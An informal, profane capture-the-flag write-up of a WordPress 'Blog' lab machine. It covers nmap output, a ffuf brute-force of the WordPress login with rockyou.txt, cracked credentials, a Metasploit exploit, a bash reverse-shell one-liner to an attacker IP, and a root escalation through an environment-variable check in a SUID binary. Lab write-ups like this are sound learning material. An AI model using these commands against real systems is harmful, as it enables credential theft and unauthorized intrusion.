# Blog.

This is a fucken web challenge that looks tougher than me. But what i'm i if i dont take on challenges that seem bigger than me.

- Just doing some looking around for now. I dont know exactly i am looking for yet. Maybe i am looking for everything and nothring at the same time.

- doing some directory fuzzing at the moment and getting some really cool routes on the blog. Hopefully i'll get something good out of it.

- My nmap scan is done and it has some pretty cooll stuff in there.
```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2020-08-05T12:05:31+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-08-05 12:05:31
|_  start_date: N/A

```

- I checked out the smb ports and fell into a dip rabbit hole. :(. Moved to the port 80 and found a wordpress site.
I fuzzed for arbitrary routes on the blog. And found some routes that revealed the site is a wordpress one. And i got the idea to do a wpscan on the website.

- Catch is i have to login as some body by all means. So now i'm trying to get logged in as a user on the blog.
- wpscan came with some pretty cool vibes. found some users and some shit like that.
lemme prepare a ffuf fuzz for this motherfucker.
```
urlencoded data = log=kwheel&pwd=password&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1

ffuf -w /opt/wordlist/rockyou.txt -X POST -d "log=kwheel&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1" -H "Content-Type: application/x-www-form-urlencoded" -b "wordpress_test_cookie=WP+Cookie+check" -u http://blog.thm/wp-login.php -mc all -fc 200
```
the fucken dast fuzzzer couldnt do shit.. it run out of memory because the file was too big for it to use.
- I'm trying to crack the password with the rockyou.txt wordlist and its taking longer than i imagined.
```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie
```
found the password.

- Logged into the account and found nothing useful there, but the login were useful later on.
Wpscan hinted that the wordpress site has a vulnerability and yes it had one with a metasploit module, so not much work to exploit.

- got a shell on the machine and run linpeas.sh on the machine. Gooing throught it to see what i can find.
i need a reverse shell
```
bash -i >& /dev/tcp/10.8.29.246/9999 0>&1 -> it didnt work.

```
i went on to look throught the linpeas output and found an unusual file with suid bit set named checker. i executed the file and it told me i wasnt admin. It was funny so i ran ltrace and found it was calling `getenv` with `admin`.
if the admin variable is not set, checker will reply with `not admin` and then quit. LOl
- So i set the value of admin variable to admin, executed checker and boom it gave me root shell.


- I learnt tons from this room